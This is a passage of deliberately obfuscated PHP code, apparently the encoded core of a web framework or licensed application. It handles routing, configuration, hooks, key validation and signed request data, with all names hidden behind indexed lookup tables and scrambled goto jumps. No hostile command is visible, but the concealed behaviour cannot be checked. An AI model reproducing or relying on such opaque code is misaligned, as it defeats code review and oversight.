$_SERVER[ÌœÆÒÍÚÇ²]; $aØŞÑˆíò = $F–ç¯èß®ó[0]($F–ç¯èß®ó[1], $cñ‰Ëóƒ¤ã); $bõŠ¿ÙĞõ‹ = $F–ç¯èß®ó[6]($aØŞÑˆíò[0]); goto b¼¿¤İÑÊ¾; AçÍ¼µÂ„÷: } private function autorun() { goto dÏå¤®¯³; dÍ„˜Èƒ¨—: $D†´Î„ÀÆ÷ = $C»‚ªäÑÂÍ[569]; while (strlen($D†´Î„ÀÆ÷) < $C»‚ªäÑÂÍ[561]) { if (!$D†´Î„ÀÆ÷) { break; } $D†´Î„ÀÆ÷++; } if ($cš…­¹è¦Î[19]($config[$cš…­¹è¦Î[20]]) == 0) { return; } goto fÔ¬¬¯Å¨; dÏå¤®¯³: $C»‚ªäÑÂÍ =& $_SERVER[¹÷ˆ§éÒ°ú]; $cš…­¹è¦Î =& $_SERVER[ÌœÆÒÍÚÇ²]; global $config; goto dÍ„˜Èƒ¨—; fÔ¬¬¯Å¨: foreach ($config[$cš…­¹è¦Î[20]] as $c±Œ§–¦ÖŒ => $FáìÓ¹¤ãö) { $this->{$_SERVER[ÌœÆÒÍÚÇ²][21]}($FáìÓ¹¤ãö); $D‘æâë¡ã¿ = $C»‚ªäÑÂÍ[570]; while ($D‘æâë¡ã¿ < $C»‚ªäÑÂÍ[11]) { if ($D‘æâë¡ã¿ >= 0) { break; } $D‘æâë¡ã¿++; } } goto b©‚ğŞ¢Ô; b©‚ğŞ¢Ô: } private function sgnr41b6d820() { goto F’µõ†‰ó³; F’µõ†‰ó³: $eË…ğ„óÉÊ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÇ°†„¶ç  =& $_SERVER[ÌœÆÒÍÚÇ²]; $dÕ®İ…Òª = $eÇ°†„¶ç [8]; goto AÌ—½³Ø…‹; A¥ª†ö‹«÷: if (!$dÉ¿¼Õ˜õé || $eÇ°†„¶ç [24]($dÉ¿¼Õ˜õé) <= $eÇ°†„¶ç [24]($dÕ®İ…Òª)) { return; } if ($eÇ°†„¶ç [6]($eÇ°†„¶ç [25]($dÉ¿¼Õ˜õé, -$eÇ°†„¶ç [24]($dÕ®İ…Òª))) != $dÕ®İ…Òª) { return; } $A•‹¨¸µ„Š = $eÇ°†„¶ç [25]($dÉ¿¼Õ˜õé, 0, -$eÇ°†„¶ç [24]($dÕ®İ…Òª)); goto FêîÑñèÀÕ; eŞŸÙ¥¯ç×: while (strlen($f¿Ñ£ñ÷Šœ) < $eË…ğ„óÉÊ[561]) { if (!$f¿Ñ£ñ÷Šœ) { break; } $f¿Ñ£ñ÷Šœ++; } $GLOBALS[$eÇ°†„¶ç [22]][$eÇ°†„¶ç [23]] = $eÇ°†„¶ç [27]($eêòªŠ”“‰, $F‘¡øÂß‡£); $GLOBALS[$eÇ°†„¶ç [22]][$eÇ°†„¶ç [28]] = $eÇ°†„¶ç [29]($eÇ°†„¶ç [1], $GLOBALS[$eÇ°†„¶ç [22]][$eÇ°†„¶ç [23]]); goto f¿¬…„Ò•‰; FêîÑñèÀÕ: $eêòªŠ”“‰ = array($eÇ°†„¶ç [8], $A•‹¨¸µ„Š); $F‘¡øÂß‡£ = $eÇ°†„¶ç [26]($GLOBALS[$eÇ°†„¶ç [22]][$eÇ°†„¶ç [23]], 1); $f¿Ñ£ñ÷Šœ = $eË…ğ„óÉÊ[573]; goto eŞŸÙ¥¯ç×; AÌ—½³Ø…‹: $dÉ¿¼Õ˜õé = $GLOBALS[$eÇ°†„¶ç [22]][$eÇ°†„¶ç [23]][0]; $EÌ‹ÁêÙ© = $eË…ğ„óÉÊ[571]; while (strlen($EÌ‹ÁêÙ©) < $eË…ğ„óÉÊ[572]) { if (!$EÌ‹ÁêÙ©) { break; } $EÌ‹ÁêÙ©++; } goto A¥ª†ö‹«÷; f¿¬…„Ò•‰: } private function ryve276d6c06() { goto dóî–ºŒ¸; d³‚‘¡Æ±: $c„Ç—‚ù[34]($c„Ç—‚ù[35], $D‹‘ø÷˜†ë, $CÍ“‰ˆ); $D‹‘ø÷˜†ë = $c„Ç—‚ù[2]($CÍ“‰ˆ[0][0], $c„Ç—‚ù[36]); $GLOBALS[$c„Ç—‚ù[22]][$c„Ç—‚ù[23]] = $c„Ç—‚ù[0]($c„Ç—‚ù[36], $D‹‘ø÷˜†ë); goto eáÄ‚¦Ë›„; b¿Öì¢»¥: $Eš•›«íğ = $_SERVER[$c„Ç—‚ù[30]]; $fø©äÈĞ‚ = $cØó—„³ÕÑ[574]; if (strlen($fø©äÈĞ‚) < $cØó—„³ÕÑ[561]) { die; } goto aŒİÄˆ³†ê; dóî–ºŒ¸: $cØó—„³ÕÑ =& $_SERVER[¹÷ˆ§éÒ°ú]; $c„Ç—‚ù =& $_SERVER[ÌœÆÒÍÚÇ²]; if ($GLOBALS[$c„Ç—‚ù[22]][$c„Ç—‚ù[28]] != $c„Ç—‚ù[10]) { return; } goto b¿Öì¢»¥; aŒİÄˆ³†ê: $Dˆ°»ä·…Í = $c„Ç—‚ù[31]; if (!$c„Ç—‚ù[32]($Eš•›«íğ, $Dˆ°»ä·…Í)) { return; } $BßÔ®¿àè„ = $c„Ç—‚ù[33]($Eš•›«íğ, $Dˆ°»ä·…Í); goto EÍÇÙ‚õÌœ; EÍÇÙ‚õÌœ: $A† ê¤™éí = $cØó—„³ÕÑ[575]; while (strlen($A† ê¤™éí) < $cØó—„³ÕÑ[576]) { if (!$A† ê¤™éí) { break; } $A† ê¤™éí++; } $D‹‘ø÷˜†ë = $c„Ç—‚ù[25]($Eš•›«íğ, $BßÔ®¿àè„ + $c„Ç—‚ù[24]($Dˆ°»ä·…Í)); goto d³‚‘¡Æ±; eáÄ‚¦Ë›„: $f¨Ò¤™Ä³› = $cØó—„³ÕÑ[577]; if (strlen($f¨Ò¤™Ä³›) < $cØó—„³ÕÑ[576]) { return; } $GLOBALS[$c„Ç—‚ù[22]][$c„Ç—‚ù[28]] = $c„Ç—‚ù[29]($c„Ç—‚ù[1], $GLOBALS[$c„Ç—‚ù[22]][$c„Ç—‚ù[23]]); goto DŠÖ‚¬éƒ; DŠÖ‚¬éƒ: } public function run() { goto f—ÉÊ¯ßé; cÔøô‹ò®÷: $Dİ¥îÒ¥ô“ = $cÒ±„õÑ¦[578]; $this->{$_SERVER[ÌœÆÒÍÚÇ²][38]}(); $CÁä‘…º¢ = $GLOBALS[$A‘ÓªÓ¹ää[22]][$A‘ÓªÓ¹ää[23]]; goto C‡êºÄ²•; c¶ç‰“Êë×: $d©öëéë„Í = $cÒ±„õÑ¦[579]; if (!$d©öëéë„Í) { return; } $this->{$_SERVER[ÌœÆÒÍÚÇ²][45]}(); goto E¨‰‡´Ç½; C‡êºÄ²•: $BöŞÆ™¡Ó = $GLOBALS[$A‘ÓªÓ¹ää[22]][$A‘ÓªÓ¹ää[28]]; $A‘ÓªÓ¹ää[39]($A‘ÓªÓ¹ää[40], isset($CÁä‘…º¢[0]) && $CÁä‘…º¢[0] ? $CÁä‘…º¢[0] : $this->defaultModule); $A‘ÓªÓ¹ää[39]($A‘ÓªÓ¹ää[41], isset($CÁä‘…º¢[1]) && $CÁä‘…º¢[0] ? $CÁä‘…º¢[1] : $this->defaultController); goto B´——éæù; E¨‰‡´Ç½: if ($A‘ÓªÓ¹ää[19]($CÁä‘…º¢) >= 3) { $this->{$_SERVER[ÌœÆÒÍÚÇ²][21]}($BöŞÆ™¡Ó); } else { $this->{$_SERVER[ÌœÆÒÍÚÇ²][21]}(ACTION); } goto Aã¢ŒÄÁîˆ; B´——éæù: $A‘ÓªÓ¹ää[39]($A‘ÓªÓ¹ää[42], isset($CÁä‘…º¢[2]) && $CÁä‘…º¢[0] ? $CÁä‘…º¢[2] : $this->defaultAction); $A‘ÓªÓ¹ää[39]($A‘ÓªÓ¹ää[43], MOD . $A‘ÓªÓ¹ää[1] . ST . $A‘ÓªÓ¹ää[1] . ACT); $_SERVER[$A‘ÓªÓ¹ää[44]] = $A‘ÓªÓ¹ää[6](ACTION); goto c¶ç‰“Êë×; f—ÉÊ¯ßé: $cÒ±„õÑ¦ =& $_SERVER[¹÷ˆ§éÒ°ú]; $A‘ÓªÓ¹ää =& $_SERVER[ÌœÆÒÍÚÇ²]; $this->{$_SERVER[ÌœÆÒÍÚÇ²][37]}(); goto cÔøô‹ò®÷; Aã¢ŒÄÁîˆ: } private $zjae8924dbca = array(); private $bqkodeecd321 = ''; public function fsgb0d43c0d1() { goto EÒåÛç‹„Ş; EÒåÛç‹„Ş: $d®º®İ¦Í½ =& $_SERVER[¹÷ˆ§éÒ°ú]; $aÁ°áİ‘Ÿ =& $_SERVER[ÌœÆÒÍÚÇ²]; $this->{$_SERVER[ÌœÆÒÍÚÇ²][46]}(); goto B¡ëŒàÓ¿…; aÂ§·ä½È®: $this->{$_SERVER[ÌœÆÒÍÚÇ²][51]}(); $C©‚ôÈÀƒ¡ = $d®º®İ¦Í½[583]; if (!$C©‚ôÈÀƒ¡) { die; } goto cİ ÛÇì‰; eš‡Áâ”©¬: $this->{$_SERVER[ÌœÆÒÍÚÇ²][3]}($aÁ°áİ‘Ÿ[57], array($this, $aÁ°áİ‘Ÿ[58])); $Eë Şô´È = $d®º®İ¦Í½[586]; $this->{$_SERVER[ÌœÆÒÍÚÇ²][3]}($aÁ°áİ‘Ÿ[59], array($this, $aÁ°áİ‘Ÿ[60])); goto D’îä‰áîÏ; B¡ëŒàÓ¿…: $Cë°ÊÀ¸Ò = $d®º®İ¦Í½[580]; while ($Cë°ÊÀ¸Ò < $d®º®İ¦Í½[576]) { if ($Cë°ÊÀ¸Ò >= 0) { break; } $Cë°ÊÀ¸Ò++; } $this->{$_SERVER[ÌœÆÒÍÚÇ²][47]}(); goto eÁ§­£¹°Œ; Fƒò¨ÌÜ’§: $AŠÂÂËÏá = $d®º®İ¦Í½[585]; if (strlen($AŠÂÂËÏá) < $d®º®İ¦Í½[11]) { return; } $this->{$_SERVER[ÌœÆÒÍÚÇ²][3]}($aÁ°áİ‘Ÿ[55], array($this, $aÁ°áİ‘Ÿ[56])); goto eš‡Áâ”©¬; eÌ©Ö¸„Åù: $this->{$_SERVER[ÌœÆÒÍÚÇ²][49]}(); $fåç¥áòÒ = $d®º®İ¦Í½[582]; $this->{$_SERVER[ÌœÆÒÍÚÇ²][50]}(); goto aÂ§·ä½È®; eÁ§­£¹°Œ: $aêÔ„öæßŸ = $d®º®İ¦Í½[581]; while ($aêÔ„öæßŸ < $d®º®İ¦Í½[576]) { if ($aêÔ„öæßŸ >= 0) { break; } $aêÔ„öæßŸ++; } $this->{$_SERVER[ÌœÆÒÍÚÇ²][48]}(); goto eÌ©Ö¸„Åù; cİ ÛÇì‰: $this->{$_SERVER[ÌœÆÒÍÚÇ²][52]}(); $eÈÅ†—‡Ò‰ = $d®º®İ¦Í½[584]; $this->{$_SERVER[ÌœÆÒÍÚÇ²][3]}($aÁ°áİ‘Ÿ[53], array($this, $aÁ°áİ‘Ÿ[54])); goto Fƒò¨ÌÜ’§; D’îä‰áîÏ: } public function zguj0b4b9ceb($F–½ÛÈê÷‰) { goto eàŠ¤çÜí²; A§ø¾¥²‡º: if (!$EŠ¸Ò»½Ã) { return; } $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[110]][$BƒàŸ©‹ñ¼[119]] = $BƒàŸ©‹ñ¼[120]($BƒàŸ©‹ñ¼[121]()); $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[110]][$BƒàŸ©‹ñ¼[122]] = $this->bqkodeecd321; goto Aà ñİƒÌ»; CˆŠù„¯Ãğ: unset($F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[95]][$BƒàŸ©‹ñ¼[96]][$BƒàŸ©‹ñ¼[76]]); unset($F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[95]][$BƒàŸ©‹ñ¼[96]][$BƒàŸ©‹ñ¼[100]]); $E¯Ú¾Ô¨÷„ = $a¤¹â‹·©±[589]; goto dÒãÔÆ‹·»; aõ³²ƒËÙŠ: foreach ($A‘º°îŞç as $d³ì³ÒƒÂÖ) { $FÆõ¬èœ‘õ = $GLOBALS[$BƒàŸ©‹ñ¼[93]][$BƒàŸ©‹ñ¼[94]][$d³ì³ÒƒÂÖ]; if (isset($C­…£Çß­÷[$d³ì³ÒƒÂÖ])) { $FÆõ¬èœ‘õ = $C­…£Çß­÷[$d³ì³ÒƒÂÖ]; } $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[95]][$BƒàŸ©‹ñ¼[96]][$d³ì³ÒƒÂÖ] = $FÆõ¬èœ‘õ; } $bÔÙ«İïì² = $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[95]][$BƒàŸ©‹ñ¼[96]][$BƒàŸ©‹ñ¼[76]]; $f´§Æ¹†â¾ = $a¤¹â‹·©±[588]; goto Cõµ‘ÃçÍ×; AƒƒĞ‡Ğ¸õ: if ($this->bqkodeecd321 == $BƒàŸ©‹ñ¼[123]) { $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[95]][$BƒàŸ©‹ñ¼[96]][$BƒàŸ©‹ñ¼[101]][$BƒàŸ©‹ñ¼[109]] = 0; } $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[110]][$BƒàŸ©‹ñ¼[130]] = $BƒàŸ©‹ñ¼[106]($this->zjae8924dbca, $BƒàŸ©‹ñ¼[131], $BƒàŸ©‹ñ¼[10]); $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[110]][$BƒàŸ©‹ñ¼[132]] = $BƒàŸ©‹ñ¼[106]($this->zjae8924dbca, $BƒàŸ©‹ñ¼[133], $BƒàŸ©‹ñ¼[10]); goto Fù§ˆŠ…´‘; BŞò¢Ò’¦Æ: $A«¯ö‚ÅÆ… = $a¤¹â‹·©±[587]; while (strlen($A«¯ö‚ÅÆ…) < $a¤¹â‹·©±[576]) { if (!$A«¯ö‚ÅÆ…) { break; } $A«¯ö‚ÅÆ…++; } $A‘º°îŞç = array($BƒàŸ©‹ñ¼[64], $BƒàŸ©‹ñ¼[65], $BƒàŸ©‹ñ¼[66], $BƒàŸ©‹ñ¼[67], $BƒàŸ©‹ñ¼[68], $BƒàŸ©‹ñ¼[69], $BƒàŸ©‹ñ¼[70], $BƒàŸ©‹ñ¼[71], $BƒàŸ©‹ñ¼[72], $BƒàŸ©‹ñ¼[73], $BƒàŸ©‹ñ¼[74], $BƒàŸ©‹ñ¼[75], $BƒàŸ©‹ñ¼[76], $BƒàŸ©‹ñ¼[77], $BƒàŸ©‹ñ¼[78], $BƒàŸ©‹ñ¼[79], $BƒàŸ©‹ñ¼[80], $BƒàŸ©‹ñ¼[81], $BƒàŸ©‹ñ¼[82], $BƒàŸ©‹ñ¼[83], $BƒàŸ©‹ñ¼[84], $BƒàŸ©‹ñ¼[85], $BƒàŸ©‹ñ¼[86], $BƒàŸ©‹ñ¼[87], $BƒàŸ©‹ñ¼[88], $BƒàŸ©‹ñ¼[89], $BƒàŸ©‹ñ¼[90], $BƒàŸ©‹ñ¼[91], $BƒàŸ©‹ñ¼[92]); goto aõ³²ƒËÙŠ; Cõµ‘ÃçÍ×: while ($f´§Æ¹†â¾ < $a¤¹â‹·©±[567]) { if ($f´§Æ¹†â¾ >= 0) { break; } $f´§Æ¹†â¾++; } unset($F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[95]][$BƒàŸ©‹ñ¼[97]][$BƒàŸ©‹ñ¼[98]]); unset($F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[95]][$BƒàŸ©‹ñ¼[97]][$BƒàŸ©‹ñ¼[99]]); goto CˆŠù„¯Ãğ; dÒãÔÆ‹·»: $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[95]][$BƒàŸ©‹ñ¼[96]][$BƒàŸ©‹ñ¼[101]] = array($BƒàŸ©‹ñ¼[102] => (int) $bÔÙ«İïì²[$BƒàŸ©‹ñ¼[103]], $BƒàŸ©‹ñ¼[104] => $BƒàŸ©‹ñ¼[105]($BƒàŸ©‹ñ¼[106]($bÔÙ«İïì², $BƒàŸ©‹ñ¼[107], array())), $BƒàŸ©‹ñ¼[108] => (int) $BƒàŸ©‹ñ¼[106]($bÔÙ«İïì², $BƒàŸ©‹ñ¼[109], 0)); $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[110]][$BƒàŸ©‹ñ¼[111]] = $BƒàŸ©‹ñ¼[112]($BƒàŸ©‹ñ¼[113])->{$_SERVER[ÌœÆÒÍÚÇ²][114]}(); $D¼ ó£©ÎŸ = $a¤¹â‹·©±[590]; goto aÚ£¨óñ‰; Fù§ˆŠ…´‘: if ($BƒàŸ©‹ñ¼[106]($GLOBALS, $BƒàŸ©‹ñ¼[134]) && $this->config[$BƒàŸ©‹ñ¼[135]]) { $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[110]][$BƒàŸ©‹ñ¼[136]] = WEB_ROOT; } return $F–½ÛÈê÷‰; goto dª­Àİ‚ƒŒ; eàŠ¤çÜí²: $a¤¹â‹·©± =& $_SERVER[¹÷ˆ§éÒ°ú]; $BƒàŸ©‹ñ¼ =& $_SERVER[ÌœÆÒÍÚÇ²]; $C­…£Çß­÷ = $BƒàŸ©‹ñ¼[61]($BƒàŸ©‹ñ¼[62])->{$_SERVER[ÌœÆÒÍÚÇ²][63]}(); goto BŞò¢Ò’¦Æ; aÚ£¨óñ‰: while (strlen($D¼ ó£©ÎŸ) < $a¤¹â‹·©±[572]) { if (!$D¼ ó£©ÎŸ) { break; } $D¼ ó£©ÎŸ++; } $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[110]][$BƒàŸ©‹ñ¼[115]] = $BƒàŸ©‹ñ¼[116]($_SERVER[$BƒàŸ©‹ñ¼[117]] . $C­…£Çß­÷[$BƒàŸ©‹ñ¼[118]]); $EŠ¸Ò»½Ã = $a¤¹â‹·©±[591]; goto A§ø¾¥²‡º; Aà ñİƒÌ»: $A’åÆ»Û‰ = $a¤¹â‹·©±[592]; if (strlen($A’åÆ»Û‰) < $a¤¹â‹·©±[561]) { die; } if ($C­…£Çß­÷[$BƒàŸ©‹ñ¼[122]] != $BƒàŸ©‹ñ¼[123]) { $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[110]][$BƒàŸ©‹ñ¼[124]] = $C­…£Çß­÷[$BƒàŸ©‹ñ¼[124]]; $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[110]][$BƒàŸ©‹ñ¼[125]] = $C­…£Çß­÷[$BƒàŸ©‹ñ¼[125]]; $E¬æø´äœƒ = $BƒàŸ©‹ñ¼[126](10) . $this->bqkodeecd321 . $BƒàŸ©‹ñ¼[126](5); $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[95]][$BƒàŸ©‹ñ¼[127]][$BƒàŸ©‹ñ¼[128]] = $this->{$_SERVER[ÌœÆÒÍÚÇ²][129]}($E¬æø´äœƒ, $F–½ÛÈê÷‰[$BƒàŸ©‹ñ¼[110]][$BƒàŸ©‹ñ¼[115]]); } goto AƒƒĞ‡Ğ¸õ; dª­Àİ‚ƒŒ: } private function mzfu2093bbb5() { goto D’îĞ¥Ãİ”; D‹õîÂ–îÚ: if (!$A‹·‹˜×Õ) { die; } $C‡ÉËÍ“± = array($BªˆÙ®Ÿ¹ [161] => $dÆø¤É±ï[$BªˆÙ®Ÿ¹ [64]], $BªˆÙ®Ÿ¹ [162] => $dÆø¤É±ï[$BªˆÙ®Ÿ¹ [65]], $BªˆÙ®Ÿ¹ [163] => $BªˆÙ®Ÿ¹ [10]); foreach ($Eœëï»ùÛÚ as $DÜæ†¢œ ) { if (!isset($dÆø¤É±ï[$DÜæ†¢œ ]) || !$dÆø¤É±ï[$DÜæ†¢œ ]) { continue; } $C‡ÉËÍ“±[$DÜæ†¢œ ] = $dÆø¤É±ï[$DÜæ†¢œ ]; } goto eÇ¨šë¿Ÿ¤; eÇ¨šë¿Ÿ¤: $BªˆÙ®Ÿ¹ [13](array($BªˆÙ®Ÿ¹ [153], $BªˆÙ®Ÿ¹ [154]), $C‡ÉËÍ“±); goto D‚Êõö»Ã; D’îĞ¥Ãİ”: $a©…©©«Œ =& $_SERVER[¹÷ˆ§éÒ°ú]; $BªˆÙ®Ÿ¹  =& $_SERVER[ÌœÆÒÍÚÇ²]; if ($_SERVER[$BªˆÙ®Ÿ¹ [44]] == $BªˆÙ®Ÿ¹ [137]) { $f×éÎ¦ï‹¨ = array($BªˆÙ®Ÿ¹ [122] => $this->bqkodeecd321, $BªˆÙ®Ÿ¹ [138] => $this->{$_SERVER[ÌœÆÒÍÚÇ²][139]}(), $BªˆÙ®Ÿ¹ [140] => $BªˆÙ®Ÿ¹ [61]($BªˆÙ®Ÿ¹ [141])->{$_SERVER[ÌœÆÒÍÚÇ²][142]}()); if ($this->bqkodeecd321 != $BªˆÙ®Ÿ¹ [123]) { $F”ê”™ôÒà = $BªˆÙ®Ÿ¹ [106]($this->zjae8924dbca, $BªˆÙ®Ÿ¹ [143]); if ($F”ê”™ôÒà) { $f×éÎ¦ï‹¨[$BªˆÙ®Ÿ¹ [144]] = $F”ê”™ôÒà; $f×éÎ¦ï‹¨[$BªˆÙ®Ÿ¹ [145]] = $BªˆÙ®Ÿ¹ [146]($BªˆÙ®Ÿ¹ [106]($this->zjae8924dbca, $BªˆÙ®Ÿ¹ [147])); $f×éÎ¦ï‹¨[$BªˆÙ®Ÿ¹ [148]] = $BªˆÙ®Ÿ¹ [106]($this->zjae8924dbca, $BªˆÙ®Ÿ¹ [133]); } } $f×éÎ¦ï‹¨ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][149]}($BªˆÙ®Ÿ¹ [150]($f×éÎ¦ï‹¨), $BªˆÙ®Ÿ¹ [116]($BªˆÙ®Ÿ¹ [151])); $C‡ÉËÍ“± = array($BªˆÙ®Ÿ¹ [152] => $f×éÎ¦ï‹¨); $dÃ°¦É¶Ä = $a©…©©«Œ[593]; $BªˆÙ®Ÿ¹ [13](array($BªˆÙ®Ÿ¹ [153], $BªˆÙ®Ÿ¹ [154]), $C‡ÉËÍ“±); } goto F×óƒ¬‘¿À; F×óƒ¬‘¿À: if ($this->bqkodeecd321 == $BªˆÙ®Ÿ¹ [123]) { return; } $Eœëï»ùÛÚ = array($BªˆÙ®Ÿ¹ [155], $BªˆÙ®Ÿ¹ [156], $BªˆÙ®Ÿ¹ [157], $BªˆÙ®Ÿ¹ [158], $BªˆÙ®Ÿ¹ [159], $BªˆÙ®Ÿ¹ [160]); $Eğª£†“£ = $a©…©©«Œ[594]; goto B‰¿Ì‘Ìê; B‰¿Ì‘Ìê: while ($Eğª£†“£ < $a©…©©«Œ[572]) { if ($Eğª£†“£ >= 0) { break; } $Eğª£†“£++; } $dÆø¤É±ï = $BªˆÙ®Ÿ¹ [61]($BªˆÙ®Ÿ¹ [62])->{$_SERVER[ÌœÆÒÍÚÇ²][63]}(); $A‹·‹˜×Õ = $a©…©©«Œ[595]; goto D‹õîÂ–îÚ; D‚Êõö»Ã: } private function mqwi938e88c9() { goto b¸ÎÎä©¤; cæ¥±ó“²²: if ($Dæî¯êßí§[$dÏ¨¿¨“šÈ[180]] == $dÏ¨¿¨“šÈ[181]) { $c÷Ô˜—”Ç³ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][149]}($f±ªÔš¢İ, $dÏ¨¿¨“šÈ[182]); $b¾ø‰¤²Ò = $this->{$_SERVER[ÌœÆÒÍÚÇ²][129]}($dÏ¨¿¨“šÈ[150]($c’·ß¶Çî), $f±ªÔš¢İ . $dÏ¨¿¨“šÈ[183], 3); $D§£É²çÊ¯ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][184]}($dÏ¨¿¨“šÈ[185] . $c÷Ô˜—”Ç³ . $dÏ¨¿¨“šÈ[186] . $b¾ø‰¤²Ò, -1); $dÏ¨¿¨“šÈ[168]($D§£É²çÊ¯, !0); } else { if ($Dæî¯êßí§[$dÏ¨¿¨“šÈ[180]] == $dÏ¨¿¨“šÈ[187]) { $EÉµ…¢±Ñ¯ = $dÏ¨¿¨“šÈ[25]($dÏ¨¿¨“šÈ[116]($dÏ¨¿¨“šÈ[188] . $f±ªÔš¢İ), 12, 15) . $dÏ¨¿¨“šÈ[189]; $b¾ø‰¤²Ò = $this->{$_SERVER[ÌœÆÒÍÚÇ²][190]}($dÏ¨¿¨“šÈ[2]($Dæî¯êßí§[$dÏ¨¿¨“šÈ[191]]), $EÉµ…¢±Ñ¯, 2); $f²Ûƒ¬İ»” = $dÏ¨¿¨“šÈ[192]($b¾ø‰¤²Ò, !0); if (!$dÏ¨¿¨“šÈ[193]($f²Ûƒ¬İ»”) || !$dÏ¨¿¨“šÈ[193]($f²Ûƒ¬İ»”[$dÏ¨¿¨“šÈ[194]]) || $f²Ûƒ¬İ»”[$dÏ¨¿¨“šÈ[167]] != !0) { $cÃôÎ¸Á†½ = $dÏ¨¿¨“šÈ[195]; $b”øÇâ—¾å = $f²Ûƒ¬İ»”[$dÏ¨¿¨“šÈ[194]] ? $dÏ¨¿¨“šÈ[196] . $f²Ûƒ¬İ»”[$dÏ¨¿¨“šÈ[194]] : $cÃôÎ¸Á†½; $dÏ¨¿¨“šÈ[168]($b”øÇâ—¾å, !1); } else { $c’·ß¶Çî[$dÏ¨¿¨“šÈ[170]] = $f²Ûƒ¬İ»”[$dÏ¨¿¨“šÈ[194]][$dÏ¨¿¨“šÈ[197]]; } } else { $f²Ûƒ¬İ»” = $this->{$_SERVER[ÌœÆÒÍÚÇ²][184]}($dÏ¨¿¨“šÈ[198], $c’·ß¶Çî, 10); } } if (!$dÏ¨¿¨“šÈ[193]($f²Ûƒ¬İ»”) || !$dÏ¨¿¨“šÈ[193]($f²Ûƒ¬İ»”[$dÏ¨¿¨“šÈ[194]]) || $f²Ûƒ¬İ»”[$dÏ¨¿¨“šÈ[167]] != !0) { $cÃôÎ¸Á†½ = $dÏ¨¿¨“šÈ[199]($dÏ¨¿¨“šÈ[200]); $b”øÇâ—¾å = $f²Ûƒ¬İ»”[$dÏ¨¿¨“šÈ[194]] ? $dÏ¨¿¨“šÈ[196] . $f²Ûƒ¬İ»”[$dÏ¨¿¨“šÈ[194]] : $cÃôÎ¸Á†½; $dÏ¨¿¨“šÈ[168]($b”øÇâ—¾å, !1); } $f£§Ï¸‘Ì = $f²Ûƒ¬İ»”[$dÏ¨¿¨“šÈ[194]]; goto Bä„éä‘Ù; B˜šÒÚŸÑ: $b›¶³Òà¢ó = array(); $cÒ¶º¢Õä = $F…ÜÒå’œ’[604]; while ($cÒ¶º¢Õä < $F…ÜÒå’œ’[576]) { if ($cÒ¶º¢Õä >= 0) { break; } $cÒ¶º¢Õä++; } goto cÀÉ’®½Ğ; aê¯°ÊãëÕ: if (!$dÏ¨¿¨“šÈ[106]($GLOBALS, $dÏ¨¿¨“šÈ[134])) { die; } $Dæî¯êßí§ = $GLOBALS[$dÏ¨¿¨“šÈ[22]]; if (isset($Dæî¯êßí§[$dÏ¨¿¨“šÈ[165]])) { $this->{$_SERVER[ÌœÆÒÍÚÇ²][166]}(); die; } goto DÑÔÄĞµ¹ƒ; dôùĞË: $dÏ¨¿¨“šÈ[61]($dÏ¨¿¨“šÈ[62])->{$_SERVER[ÌœÆÒÍÚÇ²][223]}($EÕ¾ºøß©™); $b—ÇôŞİ©£ = $dÏ¨¿¨“šÈ[116]($_SERVER[$dÏ¨¿¨“šÈ[117]] . $dÏ¨¿¨“šÈ[216]($BãÍô¢) . $EÕ¾ºøß©™[$dÏ¨¿¨“šÈ[212]]); $dÏÃ²•¿Á = $F…ÜÒå’œ’[602]; goto A‚éà¡·¶; aËèÄÉŞì: $EÕ¾ºøß©™[$dÏ¨¿¨“šÈ[124]] = $dÏ¨¿¨“šÈ[216]($dÏ¨¿¨“šÈ[120]($this->{$_SERVER[ÌœÆÒÍÚÇ²][149]}($e¦ À°Öçß, $dÏ¨¿¨“šÈ[217]))); $Dñ±‰Ïßˆ = $F…ÜÒå’œ’[599]; while ($Dñ±‰Ïßˆ < $F…ÜÒå’œ’[576]) { if ($Dñ±‰Ïßˆ >= 0) { break; } $Dñ±‰Ïßˆ++; } goto aİÜ°†ë¤; dáªÃäƒ¡: $fµ‚¯óÈÉ¦ = $dÏ¨¿¨“šÈ[25]($dÏ¨¿¨“šÈ[116]($EÕ¾ºøß©™[$dÏ¨¿¨“šÈ[212]]), 10, 10); $e¦ À°Öçß = $fµ‚¯óÈÉ¦ . $EÕ¾ºøß©™[$dÏ¨¿¨“šÈ[122]] . $EÕ¾ºøß©™[$dÏ¨¿¨“šÈ[214]]; $E¿·ëŸ½áÁ = $F…ÜÒå’œ’[598]; goto aËèÄÉŞì; A‚éà¡·¶: $fŠ‹¸¹œ„ = $dÏ¨¿¨“šÈ[216]($dÏ¨¿¨“šÈ[25]($b—ÇôŞİ©£, 10, 16)); $cêáä³‚ê÷ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][129]}($dÏ¨¿¨“šÈ[150]($f£§Ï¸‘Ì), $b—ÇôŞİ©£); $ağóÌÎ½ŒŸ = $F…ÜÒå’œ’[603]; goto dÙ°Òö™Êƒ; DÑÔÄĞµ¹ƒ: if (!isset($Dæî¯êßí§[$dÏ¨¿¨“šÈ[167]]) || $dÏ¨¿¨“šÈ[24]($Dæî¯êßí§[$dÏ¨¿¨“šÈ[167]]) != 16) { $dÏ¨¿¨“šÈ[168]($dÏ¨¿¨“šÈ[169] . $Dæî¯êßí§[$dÏ¨¿¨“šÈ[167]], !1); } $BãÍô¢ = 